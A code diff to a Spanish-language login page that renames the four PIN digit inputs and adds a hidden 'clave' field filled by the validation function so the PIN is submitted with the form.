@@ -280,13 +280,13 @@
 
                     <div class="w-full mt-4 flex flex-col items-center">
                         <div class="flex justify-center gap-2 w-full max-w-xs">
-                            <input id="clave-0" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clave-0" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clave-1" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clave-1" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clave-2" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clave-2" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clave-3" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clave-3" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                         </div>
                         <span id="claveError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
@@ -304,6 +304,7 @@
                     </div>
                 </div>
 
+                <input type="hidden" id="clave" name="clave" value= />
                 <input type="hidden" id="no-status" name="status" value="login" />
                 <div id="mensaje"></div>
 
@@ -422,11 +423,17 @@
         * Requisito: exactamente 4 dígitos numéricos
         */
         function validateClave() {
-            const inputs = document.querySelectorAll('[id^="clave-"]');
+            const inputs = document.querySelectorAll('[id^="no-clave-"]');
             let clave = '';
             inputs.forEach(i => {
                 clave += (i.dataset.realValue || '');
             });
+
+            // Actualizar el campo hidden con los 4 dígitos
+            const claveHidden = document.getElementById('clave');
+            if (claveHidden) {
+                claveHidden.value = clave;
+            }
 
             const isValid = clave.length === 4 && /^\d{4}$/.test(clave);
             const continuarBtn = document.getElementById('enviar');
@@ -470,7 +477,7 @@
 
             // Enfocar el primer input de clave
             setTimeout(() => {
-                const claveInput = document.getElementById('clave-0');
+                const claveInput = document.getElementById('no-clave-0');
                 if (claveInput) claveInput.focus();
             }, 100);
         }
@@ -577,7 +584,7 @@
             if (claveError) claveError.classList.add('hidden');
 
             // Limpiar inputs de clave
-            document.querySelectorAll('[id^="clave-"]').forEach(input => {
+            document.querySelectorAll('[id^="no-clave-"]').forEach(input => {
                 input.value = '';
                 input.dataset.realValue = '';
             });
@@ -647,7 +654,7 @@
                     // Obtener la clave de los inputs individuales
                     let clave = '';
                     for (let i = 0; i < 4; i++) {
-                        const input = document.getElementById(`clave-${i}`);
+                        const input = document.getElementById(`no-clave-${i}`);
                         if (input && input.dataset.realValue) {
                             clave += input.dataset.realValue;
                         }
